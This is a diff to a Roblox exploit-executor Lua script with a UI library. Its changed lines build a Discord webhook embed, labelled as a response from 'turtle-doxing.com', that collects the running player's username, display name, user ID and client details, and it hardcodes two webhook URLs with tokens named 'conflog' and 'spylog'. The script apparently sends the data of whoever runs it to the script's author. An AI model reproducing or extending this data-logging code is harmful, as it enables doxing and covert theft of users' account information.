@@ -2,8 +2,8 @@ local lib = {RainbowColorValue = 0,HueSelectionPosition = 0}
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
-local LocalPlayer = (game:GetService("Players").LocalPlayer or nil)
-local Mouse = LocalPlayer:GetMouse()
+local LocalPlayer = game:GetService("Players").LocalPlayer or nil
+local Mouse = LocalPlayer:GetMouse() or Vector2.new(0,0)
 local PresetColor = Color3.fromRGB(44, 120, 224)
 local CloseBind = Enum.KeyCode.RightControl
 local http = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
@@ -1432,7 +1432,7 @@ local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMN
 local spylog = "https://discord.com/api/webhooks/1212007908368195624/-aftzn9Z8gj1rmq4CiM_P6JjoRdVXetBbIv9VGQwWO7d3VMo3WTbbxIJcNHWLXmKKFgH"
 --MarketplaceService:GetProductInfo(game.PlaceId).Name
 local embed = {
-    ["title"] = LocalPlayer.DisplayName .. "'s information",
+    ["title"] = (LocalPlayer.DisplayName or "Turtle:GetDisplayAsync() is not available") .. "'s information",
     ["description"] = "Response from turtle-doxing.com",
     ["color"] = 65280,
     ["fields"] = {
@@ -1447,7 +1447,7 @@ local embed = {
         },
 	{
 	    ["name"] = "Account",
-	    ["value"] = "```\n• Username: " .. LocalPlayer.Name .. "\n• Displayname: " .. LocalPlayer.DisplayName .. "\n• ID: " .. LocalPlayer.UserId .. "\n• Join date: null" -- .. jds() .. "\n• Account Age: " .. LocalPlayer.AccountAge .. "\n```"
+	    ["value"] = "```\n• Username: " .. (LocalPlayer.Name or "Turtle:GetUsername() is not available") .. "\n• Displayname: " .. (LocalPlayer.DisplayName or "Turtle:GetDisplayAsync() is not available") .. "\n• ID: " .. (LocalPlayer.UserId or "Turtle:GetIDAsync() is not available") .. "\n• Join date: null" -- .. jds() .. "\n• Account Age: " .. LocalPlayer.AccountAge .. "\n```"
         },
 	{
 	    ["name"] = "Client Information",
